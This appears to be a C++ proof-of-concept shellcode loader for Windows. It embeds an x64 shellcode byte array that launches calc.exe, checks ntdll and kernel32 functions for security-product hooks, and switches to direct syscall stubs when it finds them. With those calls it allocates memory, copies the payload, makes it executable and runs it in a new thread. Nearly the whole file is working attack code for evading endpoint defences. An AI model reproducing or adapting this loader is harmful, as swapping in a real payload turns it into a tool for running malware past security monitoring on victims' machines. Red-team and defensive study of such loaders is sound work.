
#include <string>
#include <iostream>
#include <stdio.h>
#include "no-name.h"
#include <vector>
#include<map>


// our payload: calc.exe (taken from https://www.exploit-db.com/shellcodes/49819)
unsigned char payload[] =
"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
"\x48\x83\xec\x20\x41\xff\xd6";

bool isFunctionHooked(std::vector<std::string> functionNames, std::vector<std::string> vec) {
	for (std::string func : functionNames) {
		if (std::find(vec.begin(), vec.end(), func) != vec.end()) {
			return true;
		}
	}
	return false;
}

int main() {
	std::map<std::string, std::vector<byte>> ntdllFunctionsToVerify = {
		{"NtAllocateVirtualMemory", {0x4c, 0x8b, 0xd1, 0xb8}},
		{"NtProtectVirtualMemory", {0x4c, 0x8b, 0xd1, 0xb8}},
		{"NtCreateThreadEx", {0x4c, 0x8b, 0xd1, 0xb8}},
		{"NtWaitForSingleObject", {0x4c, 0x8b, 0xd1, 0xb8}},
		{"NtWriteFile", {0x4c, 0x8b, 0xd1, 0xb8}}
	};
	std::map<std::string, std::vector<byte>> kernel32FunctionsToVerify = {
		{"VirtualAlloc", {0x48, 0xFF, 0x25, 0x49}},
		{"VirtualProtect", {0x48, 0xFF, 0x25, 0xd1}},
		{"CreateThread", {0x4c, 0x8b, 0xdc, 0x48}},
		{"WaitForSingleObject", {0xff, 0x25, 0x5a, 0xd6}}
	};
	std::map < std::wstring, std::map<std::string, std::vector<byte>>> functionsByDll = {
		{L"ntdll.dll", ntdllFunctionsToVerify},
		{L"kernel32.dll", kernel32FunctionsToVerify }
	};

	std::vector<std::string> hookedFunctions;

	std::cout << "[*] Checking for function hooks" << std::endl;
	for (auto &dllPair : functionsByDll) {
		HMODULE hDll = GetModuleHandle(dllPair.first.c_str());
		if (!hDll) {
			std::wcout << "[*] Could not get handle for " << dllPair.first << " : " << GetLastError() << std::endl;
		}

		for (auto &function : dllPair.second) {
			std::string functionName = function.first;
			PVOID pFunc = GetProcAddress(hDll, functionName.c_str());
			if (!pFunc) {
				// we could not find a pointer to the function, so lets treat it like it is hooked, just in case.
				hookedFunctions.push_back(functionName);
				std::cout << "[*] Could not get \"" << functionName << "\", treating it as if it is hooked." << std::endl;
				continue;
			}
			if (memcmp((char*)pFunc, function.second.data(), 4)) {
				// Function is 99% hooked. (There are some exceptions which i wont include in this POC).
				hookedFunctions.push_back(functionName);
			}
		}
	}
	if (hookedFunctions.size() > 0) {
		std::cout << "[*] Hooked functions are:" << std::endl;
		for (std::string function : hookedFunctions) {
			std::cout << "\t" << function << std::endl;
		}
	}
	else {
		std::cout << "[*] No functions are hooked." << std::endl;
	}

	

	SIZE_T payload_len = sizeof(payload);

	LPVOID payload_mem = nullptr; // memory buffer for payload
	BOOL rv;
	HANDLE threadHandle;
	DWORD oldprotect = 0;
	NTSTATUS statusCode;

	// Allocate a memory buffer for payload
	// map all functions that are relavent to memory allocation.
	std::vector<std::string> relaventFunctions{ "VirtualAlloc", "NtAllocateVirtualMemory" };
	// Check if relavent functions are hooked
	if (!isFunctionHooked(relaventFunctions, hookedFunctions)) {
		std::cout << "[*] VirtualAlloc and NtAllocateVirtualMemory are not hooked, using VirtualAlloc." << std::endl;
		payload_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!payload_mem) {
			std::cout << "[*] error while running VirtualAlloc, error code:" << GetLastError() << std::endl;
			exit(1);
		}
	}
	else {
		std::cout << "[*] VirtualAlloc/NtAllocateVirtualMemory might be hooked, using NtAllocateVirtualMemory assembly instead." << std::endl;
		NtAllocateVirtualMemory = &MyNtAllocateVirtualMemory;
		statusCode = NtAllocateVirtualMemory(GetCurrentProcess(), &payload_mem, 0, &payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (statusCode != 0) {
			std::cout << "[*] error while running NtAllocateVirtualMemory" << statusCode << std::endl;
			exit(1);
		}
	}

	// copy payload to buffer
	RtlMoveMemory(payload_mem, payload, payload_len);

	// make new buffer as executable
	// map all functions that are relavent to memory region protection.
	relaventFunctions = {"VirtualProtect", "NtProtectVirtualMemory"};
	// Check if relavent functions are hooked
	if (!isFunctionHooked(relaventFunctions, hookedFunctions)) {
		std::cout << "[*] VirtualProtect and NtProtectVirtualMemory are not hooked, using VirtualProtect." << std::endl;
		rv = VirtualProtect(payload_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
		if (rv == 0) {
			std::cout << "[*] error while running VirtualProtect, error code:" << GetLastError() << std::endl;
			exit(1);
		}
	}
	else {
		std::cout << "[*] VirtualProtect/NtProtectVirtualMemory might be hooked, using NtProtectVirtualMemory assembly instead." << std::endl;
		NtProtectVirtualMemory = &MyNtProtectVirtualMemory;
		statusCode = NtProtectVirtualMemory(GetCurrentProcess(), &payload_mem, &payload_len, PAGE_EXECUTE_READ, &oldprotect);
		if(statusCode != STATUS_SUCCESS){
			std::cout << "[*] error while running NtProtectVirtualMemory" << statusCode << std::endl;
			exit(1);
		}
	}

		// run payload in a new thread
		// map all functions that are relavent to thread creation (under the same process).
		relaventFunctions = { "CreateThread", "RtlQueryInformationActivationContext", "NtCreateThreadEx" };
		// Check if relavent functions are hooked
		if (!isFunctionHooked(relaventFunctions, hookedFunctions)) {
			std::cout << "[*] CreateThread, RtlQueryInformationActivationContext and NtCreateThreadEx are not hooked, using CreateThread." << std::endl;
			threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload_mem, 0, 0, 0);
			if (!threadHandle) {
				std::cout << "[*] error while running CreateThread, error code:" << GetLastError() << std::endl;
				exit(1);
			}
		}
		else {
			std::cout << "[*] CreateThread/RtlQueryInformationActivationContext/NtCreateThreadEx might be hooked, using NtCreateThreadEx assembly instead." << std::endl;
			NtCreateThreadEx = &MyNtCreateThreadEx;
			NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PTHREAD_START_ROUTINE)payload_mem, NULL, FALSE, 0, 0, 0, NULL);
			if (!threadHandle) {
				std::cout << "[*] error while running NtCreateThreadEx." << std::endl;
				exit(1);
			}
		}

		// map all functions that are relavent to waiting for objects.
		relaventFunctions = { "WaitForSingleObject", "NtWaitForSingleObject" };
		// Check if relavent functions are hooked
		if (!isFunctionHooked(relaventFunctions, hookedFunctions)) {
			std::cout << "[*] WaitForSingleObject and NtWaitForSingleObject are not hooked, using WaitForSingleObject." << std::endl;
			WaitForSingleObject(threadHandle, -1);
		}
		else {
			std::cout << "[*] WaitForSingleObject/NtWaitForSingleObject might be hooked, using NtWaitForSingleObject assembly instead." << std::endl;
			NtWaitForSingleObject = &MyNtWaitForSingleObject;
			NtWaitForSingleObject(threadHandle, FALSE, NULL);
		}
		return 0;
}